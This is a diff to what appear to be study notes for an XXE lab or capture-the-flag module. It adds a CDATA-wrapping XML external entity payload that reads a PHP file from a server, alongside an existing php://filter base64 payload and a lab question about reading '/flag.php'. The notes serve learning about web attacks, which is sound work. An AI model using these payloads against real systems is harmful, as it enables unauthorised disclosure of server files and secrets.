@@ -65,6 +65,15 @@ done
   <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=connection.php">
 ]>
 ```
+## Advanced Exfiltration with CDATA
+```Code: xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
 ## Advanced File Disclosure
 
 >**Q. Use either method from this section to read the flag at '/flag.php'. (You may use the CDATA method at '/index.php', or the error-based method at '/error').**
